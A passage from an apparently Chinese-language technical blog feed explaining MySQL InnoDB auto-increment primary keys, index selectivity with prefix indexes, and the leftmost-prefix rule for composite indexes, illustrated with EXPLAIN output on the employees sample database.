        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 使用自增主键的好处 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="主键选择"><a href="#主键选择" class="headerlink" title="主键选择"></a>主键选择</h3><p>在使用InnoDB存储引擎时，如果没有特别的需要，请永远使用一个与业务无关的自增字段作为主键。在使用InnoDB存储引擎时，如果没有特别的需要，请永远使用一个与业务无关的自增字段作为主键。在使用InnoDB存储引擎时，如果没有特别的需要，请永远使用一个与业务无关的自增字段作为主键。</p><p>重要的话说三遍。</p><h3 id="插入优化"><a href="#插入优化" class="headerlink" title="插入优化"></a>插入优化</h3><p>使用自增主键的意义是什么？</p><p>InnoDB使用聚集索引（<a href="/2018/08/16/MySQL索引实现/">MySQL索引实现</a>），数据记录本身被存于主索引（一颗B+Tree）的叶子节点上。这就要求同一个叶子节点内（大小为一个内存页或磁盘页）的各条数据记录按主键顺序存放，因此每当有一条新的记录插入时，MySQL会根据其主键将其插入适当的节点和位置，如果页面达到装载因子（InnoDB默认为15/16），则开辟一个新的页（节点）。</p><p>如果表使用自增主键，那么每次插入新的记录，记录就会顺序添加到当前索引节点的后续位置，当一页写满，就会自动开辟一个新的页。如下图所示：</p><img src="/2018/08/20/2018-08-20-InnoDB的主键选择与插入优化/pic1.png"><p>这样就会形成一个紧凑的索引结构，近似顺序填满。由于每次插入时也不需要移动已有数据，因此效率很高，也不会增加很多开销在维护索引上。</p><p>如果使用非自增主键（如果身份证号或学号等），由于每次插入主键的值近似于随机，因此每次新纪录都要被插到现有索引页得中间某个位置：</p><img src="/2018/08/20/2018-08-20-InnoDB的主键选择与插入优化/pic2.png"><p>此时MySQL不得不为了将新记录插到合适位置而移动数据，甚至目标页面可能已经被回写到磁盘上而从缓存中清掉，此时又要从磁盘上读回来，这增加了很多开销，同时频繁的移动、分页操作造成了大量的碎片，得到了不够紧凑的索引结构，后续不得不通过OPTIMIZE TABLE来重建表并优化填充页面。</p><p>因此，只要可以，请尽量在InnoDB上采用自增字段做主键。</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
            <tag> 数据库 </tag>
            
            <tag> InnoDB </tag>
            
            <tag> 存储引擎 </tag>
            
            <tag> 索引 </tag>
            
            <tag> 数据库优化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>索引选择性与前缀索引</title>
      <link href="/2018/08/19/2018-08-19-%E7%B4%A2%E5%BC%95%E9%80%89%E6%8B%A9%E6%80%A7%E4%B8%8E%E5%89%8D%E7%BC%80%E7%B4%A2%E5%BC%95/"/>
      <url>/2018/08/19/2018-08-19-%E7%B4%A2%E5%BC%95%E9%80%89%E6%8B%A9%E6%80%A7%E4%B8%8E%E5%89%8D%E7%BC%80%E7%B4%A2%E5%BC%95/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 善用索引更要慎用索引 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="万能药？"><a href="#万能药？" class="headerlink" title="万能药？"></a>万能药？</h3><p>在一般情况下，建立索引可以加快查询速度，那么是不是只要是查询语句需要，就在相应字段建上索引？</p><p>当然不是。索引虽然加快了查询速度，但是你得为此付出代价：</p><ul><li>索引文件会消耗存储空间</li><li>索引会加重插入、删除、修改记录的负担</li><li>MySQL在运行时也要消耗资源维护索引</li></ul><p>因此，索引并不是越多越好，一般两种情况下不建议建索引：</p><ul><li>表记录比较少，没必要建索引，让查询做全表扫描就好了。</li><li>索引的选择性较低。</li></ul><h3 id="索引的选择性"><a href="#索引的选择性" class="headerlink" title="索引的选择性"></a>索引的选择性</h3><p>所谓索引的选择性（Selectivity），是指不重复的索引值（也叫基数，Cardinality）与表记录数（#T）的比值：</p><blockquote><p>Index Selectivity = Cardinality / #T</p></blockquote><p>显然选择性的取值范围为(0, 1]，选择性越高的索引价值越大，这是由B+Tree的性质决定的。</p><p>看一个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT count(DISTINCT(title))/count(*) AS Selectivity FROM employees.titles;</span><br><span class="line"></span><br><span class="line">+-------------+</span><br><span class="line">| Selectivity |</span><br><span class="line">+-------------+</span><br><span class="line">|      0.0000 |</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></figure><p>title的选择性不足0.0001（精确值为0.00001579），所以实在没有什么必要为其单独建索引。</p><h3 id="前缀索引"><a href="#前缀索引" class="headerlink" title="前缀索引"></a>前缀索引</h3><p>有一种与索引选择性有关的索引优化策略叫做前缀索引，就是用列的前缀代替整个列作为索引key，当前缀长度合适时，可以做到既使得前缀索引的选择性接近全列索引，同时因为索引key变短而减少了索引文件的大小和维护开销。</p><p>假设employees表只有一个索引，那么如果我们想按名字搜索一个人，就只能全表扫描了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">EXPLAIN SELECT * FROM employees.employees WHERE first_name=&apos;Eric&apos; AND last_name=&apos;Anido&apos;;</span><br><span class="line"></span><br><span class="line">+----+-------------+-----------+------+---------------+------+---------+------+--------+-------------+</span><br><span class="line">| id | select_type | table     | type | possible_keys | key  | key_len | ref  | rows   | Extra       |</span><br><span class="line">+----+-------------+-----------+------+---------------+------+---------+------+--------+-------------+</span><br><span class="line">|  1 | SIMPLE      | employees | ALL  | NULL          | NULL | NULL    | NULL | 300024 | Using where |</span><br><span class="line">+----+-------------+-----------+------+---------------+------+---------+------+--------+-------------+</span><br></pre></td></tr></table></figure><p>如果频繁按名字搜索员工，这样显然效率很低，因此我们可以考虑建索引。有两种选择，看下两个索引的选择性：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">SELECT count(DISTINCT(first_name))/count(*) AS Selectivity FROM employees.employees;</span><br><span class="line"></span><br><span class="line">+-------------+</span><br><span class="line">| Selectivity |</span><br><span class="line">+-------------+</span><br><span class="line">|      0.0042 |</span><br><span class="line">+-------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SELECT count(DISTINCT(concat(first_name, last_name)))/count(*) AS Selectivity FROM employees.employees;</span><br><span class="line"></span><br><span class="line">+-------------+</span><br><span class="line">| Selectivity |</span><br><span class="line">+-------------+</span><br><span class="line">|      0.9313 |</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></figure><p>第一种显然选择性太低，第二种虽然选择性很好，但是first_name和last_name加起来长度为30，有没有兼顾长度和选择性的办法？可以考虑用first_name和last_name的前几个字符建立索引，例如，看看其选择性：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT count(DISTINCT(concat(first_name, left(last_name, 3))))/count(*) AS Selectivity FROM employees.employees;</span><br><span class="line"></span><br><span class="line">+-------------+</span><br><span class="line">| Selectivity |</span><br><span class="line">+-------------+</span><br><span class="line">|      0.7879 |</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></figure><p>选择性还不错，但离0.9313还是有点距离，那么把last_name前缀加到4：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT count(DISTINCT(concat(first_name, left(last_name, 4))))/count(*) AS Selectivity FROM employees.employees;</span><br><span class="line"></span><br><span class="line">+-------------+</span><br><span class="line">| Selectivity |</span><br><span class="line">+-------------+</span><br><span class="line">|      0.9007 |</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></figure><p>这时选择性已经很理想了，而这个索引的长度只有18，比短了接近一半，我们把这个前缀索引 建上：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE employees.employees</span><br><span class="line">ADD INDEX `first_name_last_name4` (first_name, last_name(4));</span><br></pre></td></tr></table></figure><p>此时再执行一遍按名字查询，比较分析一下与建索引前的结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SHOW PROFILES;</span><br><span class="line"></span><br><span class="line">+----------+------------+---------------------------------------------------------------------------------+</span><br><span class="line">| Query_ID | Duration   | Query                                                                           |</span><br><span class="line">+----------+------------+---------------------------------------------------------------------------------+</span><br><span class="line">|       87 | 0.11941700 | SELECT * FROM employees.employees WHERE first_name=&apos;Eric&apos; AND last_name=&apos;Anido&apos; |</span><br><span class="line">|       90 | 0.00092400 | SELECT * FROM employees.employees WHERE first_name=&apos;Eric&apos; AND last_name=&apos;Anido&apos; |</span><br><span class="line">+----------+------------+---------------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure><p>性能的提升是显著的，查询速度提高了120多倍。</p><p>前缀索引兼顾索引大小和查询速度，但是其缺点是不能用于ORDER BY和GROUP BY操作，也不能用于Covering index（即当索引本身包含查询所需全部数据时，不再访问数据文件本身）。</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
            <tag> 索引 </tag>
            
            <tag> 数据库优化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>索引的最左前缀原则</title>
      <link href="/2018/08/19/2018-08-19-%E7%B4%A2%E5%BC%95%E7%9A%84%E6%9C%80%E5%B7%A6%E5%89%8D%E7%BC%80%E5%8E%9F%E5%88%99/"/>
      <url>/2018/08/19/2018-08-19-%E7%B4%A2%E5%BC%95%E7%9A%84%E6%9C%80%E5%B7%A6%E5%89%8D%E7%BC%80%E5%8E%9F%E5%88%99/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 联合索引 / 复合索引 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="为什么会有最左前缀原则"><a href="#为什么会有最左前缀原则" class="headerlink" title="为什么会有最左前缀原则"></a>为什么会有最左前缀原则</h3><p>常言，知其然更要知其所以然。<br>为什么会有最左前缀原则呢？<br>这其实是跟索引的存储结构相关的，详情可以查看<a href="/2018/08/16/索引背后的数据结构与算法/">索引背后的数据结构与算法</a>。</p><h3 id="什么是最左前缀原则"><a href="#什么是最左前缀原则" class="headerlink" title="什么是最左前缀原则"></a>什么是最左前缀原则</h3><p>MySQL中，索引可以以一定的<strong>顺序</strong>引用多个列，这种索引就叫做联合索引（或复合索引）。<br>一般的，一个联合索引是一个有序元组，其中各个元素均为数据表的一列。</p><p>如有表titles如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SHOW INDEX FROM titles;</span><br><span class="line"></span><br><span class="line">+--------+------------+----------+--------------+-------------+-----------+-------------+------+------------+</span><br><span class="line">| Table  | Non_unique | Key_name | Seq_in_index | Column_name | Collation | Cardinality | Null | Index_type |</span><br><span class="line">+--------+------------+----------+--------------+-------------+-----------+-------------+------+------------+</span><br><span class="line">| titles |          0 | PRIMARY  |            1 | emp_no      | A         |        NULL |      | BTREE      |</span><br><span class="line">| titles |          0 | PRIMARY  |            2 | title       | A         |        NULL |      | BTREE      |</span><br><span class="line">| titles |          0 | PRIMARY  |            3 | from_date   | A         |      443308 |      | BTREE      |</span><br><span class="line">+--------+------------+----------+--------------+-------------+-----------+-------------+------+------------+</span><br></pre></td></tr></table></figure><h4 id="情况一：全列匹配"><a href="#情况一：全列匹配" class="headerlink" title="情况一：全列匹配"></a>情况一：全列匹配</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">EXPLAIN SELECT * FROM employees.titles WHERE emp_no=&apos;10001&apos; AND title=&apos;Senior Engineer&apos; AND from_date=&apos;1986-06-26&apos;;</span><br><span class="line"></span><br><span class="line">+----+-------------+--------+-------+---------------+---------+---------+-------------------+------+-------+</span><br><span class="line">| id | select_type | table  | type  | possible_keys | key     | key_len | ref               | rows | Extra |</span><br><span class="line">+----+-------------+--------+-------+---------------+---------+---------+-------------------+------+-------+</span><br><span class="line">|  1 | SIMPLE      | titles | const | PRIMARY       | PRIMARY | 59      | const,const,const |    1 |       |</span><br><span class="line">+----+-------------+--------+-------+---------------+---------+---------+-------------------+------+-------+</span><br></pre></td></tr></table></figure><p>很明显，当按照索引中所有列进行精确匹配（这里精确匹配指“=”或“IN”匹配）时，索引可以被用到。</p><p>这里有一点需要注意，理论上索引对顺序是敏感的，但是由于MySQL的查询优化器会自动调整where子句的条件顺序以使用适合的索引，例如我们将where中的条件顺序颠倒：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">EXPLAIN SELECT * FROM employees.titles WHERE from_date=&apos;1986-06-26&apos; AND emp_no=&apos;10001&apos; AND title=&apos;Senior Engineer&apos;;</span><br><span class="line"></span><br><span class="line">+----+-------------+--------+-------+---------------+---------+---------+-------------------+------+-------+</span><br><span class="line">| id | select_type | table  | type  | possible_keys | key     | key_len | ref               | rows | Extra |</span><br><span class="line">+----+-------------+--------+-------+---------------+---------+---------+-------------------+------+-------+</span><br><span class="line">|  1 | SIMPLE      | titles | const | PRIMARY       | PRIMARY | 59      | const,const,const |    1 |       |</span><br><span class="line">+----+-------------+--------+-------+---------------+---------+---------+-------------------+------+-------+</span><br></pre></td></tr></table></figure><p>效果是一样的。</p><h4 id="情况二：最左前缀匹配"><a href="#情况二：最左前缀匹配" class="headerlink" title="情况二：最左前缀匹配"></a>情况二：最左前缀匹配</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">EXPLAIN SELECT * FROM employees.titles WHERE emp_no=&apos;10001&apos;;</span><br><span class="line"></span><br><span class="line">+----+-------------+--------+------+---------------+---------+---------+-------+------+-------+</span><br><span class="line">| id | select_type | table  | type | possible_keys | key     | key_len | ref   | rows | Extra |</span><br><span class="line">+----+-------------+--------+------+---------------+---------+---------+-------+------+-------+</span><br><span class="line">|  1 | SIMPLE      | titles | ref  | PRIMARY       | PRIMARY | 4       | const |    1 |       |</span><br><span class="line">+----+-------------+--------+------+---------------+---------+---------+-------+------+-------+</span><br></pre></td></tr></table></figure><p>当查询条件精确匹配索引的左边连续一个或几个列时，如或，所以可以被用到，但是只能用到一部分，即条件所组成的最左前缀。上面的查询从分析结果看用到了PRIMARY索引，但是key_len为4，说明只用到了索引的第一列前缀。</p><h4 id="情况三：查询条件用到了索引中列的精确匹配，但是中间某个条件未提供"><a href="#情况三：查询条件用到了索引中列的精确匹配，但是中间某个条件未提供" class="headerlink" title="情况三：查询条件用到了索引中列的精确匹配，但是中间某个条件未提供"></a>情况三：查询条件用到了索引中列的精确匹配，但是中间某个条件未提供</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">EXPLAIN SELECT * FROM employees.titles WHERE emp_no=&apos;10001&apos; AND from_date=&apos;1986-06-26&apos;;</span><br><span class="line"></span><br><span class="line">+----+-------------+--------+------+---------------+---------+---------+-------+------+-------------+</span><br><span class="line">| id | select_type | table  | type | possible_keys | key     | key_len | ref   | rows | Extra       |</span><br><span class="line">+----+-------------+--------+------+---------------+---------+---------+-------+------+-------------+</span><br><span class="line">|  1 | SIMPLE      | titles | ref  | PRIMARY       | PRIMARY | 4       | const |    1 | Using where |</span><br><span class="line">+----+-------------+--------+------+---------------+---------+---------+-------+------+-------------+</span><br></pre></td></tr></table></figure><p>此时索引使用情况和情况二相同，因为title未提供，所以查询只用到了索引的第一列，而后面的from_date虽然也在索引中，但是由于title不存在而无法和左前缀连接，因此需要对结果进行扫描过滤from_date（这里由于emp_no唯一，所以不存在扫描）。如果想让from_date也使用索引而不是where过滤，可以增加一个辅助索引，此时上面的查询会使用这个索引。除此之外，还可以使用一种称之为“隔离列”的优化方法，将emp_no与from_date之间的“坑”填上。</p><p>首先我们看下title一共有几种不同的值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SELECT DISTINCT(title) FROM employees.titles;</span><br><span class="line">+--------------------+</span><br><span class="line">| title              |</span><br><span class="line">+--------------------+</span><br><span class="line">| Senior Engineer    |</span><br><span class="line">| Staff              |</span><br><span class="line">| Engineer           |</span><br><span class="line">| Senior Staff       |</span><br><span class="line">| Assistant Engineer |</span><br><span class="line">| Technique Leader   |</span><br><span class="line">| Manager            |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure><p>只有7种。在这种成为“坑”的列值比较少的情况下，可以考虑用“IN”来填补这个“坑”从而形成最左前缀：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">EXPLAIN SELECT * FROM employees.titles</span><br><span class="line">WHERE emp_no=&apos;10001&apos;</span><br><span class="line">AND title IN (&apos;Senior Engineer&apos;, &apos;Staff&apos;, &apos;Engineer&apos;, &apos;Senior Staff&apos;, &apos;Assistant Engineer&apos;, &apos;Technique Leader&apos;, &apos;Manager&apos;)</span><br><span class="line">AND from_date=&apos;1986-06-26&apos;;</span><br><span class="line"></span><br><span class="line">+----+-------------+--------+-------+---------------+---------+---------+------+------+-------------+</span><br><span class="line">| id | select_type | table  | type  | possible_keys | key     | key_len | ref  | rows | Extra       |</span><br><span class="line">+----+-------------+--------+-------+---------------+---------+---------+------+------+-------------+</span><br><span class="line">|  1 | SIMPLE      | titles | range | PRIMARY       | PRIMARY | 59      | NULL |    7 | Using where |</span><br><span class="line">+----+-------------+--------+-------+---------------+---------+---------+------+------+-------------+</span><br></pre></td></tr></table></figure><p>这次key_len为59，说明索引被用全了，但是从type和rows看出IN实际上执行了一个range查询，这里检查了7个key。看下两种查询的性能比较：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SHOW PROFILES;</span><br><span class="line"></span><br><span class="line">+----------+------------+-------------------------------------------------------------------------------+</span><br><span class="line">| Query_ID | Duration   | Query                                                                         |</span><br><span class="line">+----------+------------+-------------------------------------------------------------------------------+</span><br><span class="line">|       10 | 0.00058000 | SELECT * FROM employees.titles WHERE emp_no=&apos;10001&apos; AND from_date=&apos;1986-06-26&apos;|</span><br><span class="line">|       11 | 0.00052500 | SELECT * FROM employees.titles WHERE emp_no=&apos;10001&apos; AND title IN ...          |</span><br><span class="line">+----------+------------+-------------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure><p>“填坑”后性能提升了一点。如果经过emp_no筛选后余下很多数据，则后者性能优势会更加明显。当然，如果title的值很多，用填坑就不合适了，必须建立辅助索引。</p><h4 id="情况四：查询条件没有指定索引第一列"><a href="#情况四：查询条件没有指定索引第一列" class="headerlink" title="情况四：查询条件没有指定索引第一列"></a>情况四：查询条件没有指定索引第一列</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">EXPLAIN SELECT * FROM employees.titles WHERE from_date=&apos;1986-06-26&apos;;</span><br><span class="line"></span><br><span class="line">+----+-------------+--------+------+---------------+------+---------+------+--------+-------------+</span><br><span class="line">| id | select_type | table  | type | possible_keys | key  | key_len | ref  | rows   | Extra       |</span><br><span class="line">+----+-------------+--------+------+---------------+------+---------+------+--------+-------------+</span><br><span class="line">|  1 | SIMPLE      | titles | ALL  | NULL          | NULL | NULL    | NULL | 443308 | Using where |</span><br><span class="line">+----+-------------+--------+------+---------------+------+---------+------+--------+-------------+</span><br></pre></td></tr></table></figure><p>由于不是最左前缀，索引这样的查询显然用不到索引。</p><h4 id="情况五：匹配某列的前缀字符串"><a href="#情况五：匹配某列的前缀字符串" class="headerlink" title="情况五：匹配某列的前缀字符串"></a>情况五：匹配某列的前缀字符串</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">EXPLAIN SELECT * FROM employees.titles WHERE emp_no=&apos;10001&apos; AND title LIKE &apos;Senior%&apos;;</span><br><span class="line"></span><br><span class="line">+----+-------------+--------+-------+---------------+---------+---------+------+------+-------------+</span><br><span class="line">| id | select_type | table  | type  | possible_keys | key     | key_len | ref  | rows | Extra       |</span><br><span class="line">+----+-------------+--------+-------+---------------+---------+---------+------+------+-------------+</span><br><span class="line">|  1 | SIMPLE      | titles | range | PRIMARY       | PRIMARY | 56      | NULL |    1 | Using where |</span><br><span class="line">+----+-------------+--------+-------+---------------+---------+---------+------+------+-------------+</span><br></pre></td></tr></table></figure><p>此时可以用到索引，但是如果通配符%出现在开头，则无法使用索引。</p><h4 id="情况六：范围查询"><a href="#情况六：范围查询" class="headerlink" title="情况六：范围查询"></a>情况六：范围查询</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">EXPLAIN SELECT * FROM employees.titles WHERE emp_no &lt; &apos;10010&apos; and title=&apos;Senior Engineer&apos;;</span><br><span class="line"></span><br><span class="line">+----+-------------+--------+-------+---------------+---------+---------+------+------+-------------+</span><br><span class="line">| id | select_type | table  | type  | possible_keys | key     | key_len | ref  | rows | Extra       |</span><br><span class="line">+----+-------------+--------+-------+---------------+---------+---------+------+------+-------------+</span><br><span class="line">|  1 | SIMPLE      | titles | range | PRIMARY       | PRIMARY | 4       | NULL |   16 | Using where |</span><br><span class="line">+----+-------------+--------+-------+---------------+---------+---------+------+------+-------------+</span><br></pre></td></tr></table></figure><p>范围列可以用到索引（必须是最左前缀），但是范围列后面的列无法用到索引。同时，索引最多用于一个范围列，因此如果查询条件中有两个范围列则无法全用到索引。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">EXPLAIN SELECT * FROM employees.titles</span><br><span class="line">WHERE emp_no &lt; &apos;10010&apos;</span><br><span class="line">AND title=&apos;Senior Engineer&apos;</span><br><span class="line">AND from_date BETWEEN &apos;1986-01-01&apos; AND &apos;1986-12-31&apos;;</span><br><span class="line"></span><br><span class="line">+----+-------------+--------+-------+---------------+---------+---------+------+------+-------------+</span><br><span class="line">| id | select_type | table  | type  | possible_keys | key     | key_len | ref  | rows | Extra       |</span><br><span class="line">+----+-------------+--------+-------+---------------+---------+---------+------+------+-------------+</span><br><span class="line">|  1 | SIMPLE      | titles | range | PRIMARY       | PRIMARY | 4       | NULL |   16 | Using where |</span><br><span class="line">+----+-------------+--------+-------+---------------+---------+---------+------+------+-------------+</span><br></pre></td></tr></table></figure><p>可以看到索引对第二个范围索引无能为力。</p><p>这里特别要说明MySQL一个有意思的地方，那就是仅用explain可能无法区分范围索引和多值匹配，因为在type中这两者都显示为range。同时，用了“between”并不意味着就是范围查询，例如下面的查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">EXPLAIN SELECT * FROM employees.titles</span><br><span class="line">WHERE emp_no BETWEEN &apos;10001&apos; AND &apos;10010&apos;</span><br><span class="line">AND title=&apos;Senior Engineer&apos;</span><br><span class="line">AND from_date BETWEEN &apos;1986-01-01&apos; AND &apos;1986-12-31&apos;;</span><br><span class="line"></span><br><span class="line">+----+-------------+--------+-------+---------------+---------+---------+------+------+-------------+</span><br><span class="line">| id | select_type | table  | type  | possible_keys | key     | key_len | ref  | rows | Extra       |</span><br><span class="line">+----+-------------+--------+-------+---------------+---------+---------+------+------+-------------+</span><br><span class="line">|  1 | SIMPLE      | titles | range | PRIMARY       | PRIMARY | 59      | NULL |   16 | Using where |</span><br><span class="line">+----+-------------+--------+-------+---------------+---------+---------+------+------+-------------+</span><br></pre></td></tr></table></figure><p>看起来是用了两个范围查询，但作用于emp_no上的“BETWEEN”实际上相当于“IN”，也就是说emp_no实际是多值精确匹配。可以看到这个查询用到了索引全部三个列。因此在MySQL中要谨慎地区分多值匹配和范围匹配，否则会对MySQL的行为产生困惑。</p><h4 id="情况七：查询条件中含有函数或表达式"><a href="#情况七：查询条件中含有函数或表达式" class="headerlink" title="情况七：查询条件中含有函数或表达式"></a>情况七：查询条件中含有函数或表达式</h4><p>很不幸，如果查询条件中含有函数或表达式，则MySQL不会为这列使用索引（虽然某些在数学意义上可以使用）。例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">EXPLAIN SELECT * FROM employees.titles WHERE emp_no=&apos;10001&apos; AND left(title, 6)=&apos;Senior&apos;;</span><br><span class="line">+----+-------------+--------+------+---------------+---------+---------+-------+------+-------------+</span><br><span class="line">| id | select_type | table  | type | possible_keys | key     | key_len | ref   | rows | Extra       |</span><br><span class="line">+----+-------------+--------+------+---------------+---------+---------+-------+------+-------------+</span><br><span class="line">|  1 | SIMPLE      | titles | ref  | PRIMARY       | PRIMARY | 4       | const |    1 | Using where |</span><br><span class="line">+----+-------------+--------+------+---------------+---------+---------+-------+------+-------------+</span><br></pre></td></tr></table></figure><p>虽然这个查询和情况五中功能相同，但是由于使用了函数left，则无法为title列应用索引，而情况五中用LIKE则可以。再如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">EXPLAIN SELECT * FROM employees.titles WHERE emp_no - 1=&apos;10000&apos;;</span><br><span class="line">+----+-------------+--------+------+---------------+------+---------+------+--------+-------------+</span><br><span class="line">| id | select_type | table  | type | possible_keys | key  | key_len | ref  | rows   | Extra       |</span><br><span class="line">+----+-------------+--------+------+---------------+------+---------+------+--------+-------------+</span><br><span class="line">|  1 | SIMPLE      | titles | ALL  | NULL          | NULL | NULL    | NULL | 443308 | Using where |</span><br><span class="line">+----+-------------+--------+------+---------------+------+---------+------+--------+-------------+</span><br></pre></td></tr></table></figure><p>显然这个查询等价于查询emp_no为10001的函数，但是由于查询条件是一个表达式，MySQL无法为其使用索引。看来MySQL还没有智能到自动优化常量表达式的程度，因此在写查询语句时尽量避免表达式出现在查询中，而是先手工私下代数运算，转换为无表达式的查询语句。</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
            <tag> 索引 </tag>
            
            <tag> 数据库优化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>索引背后的数据结构与算法</title>
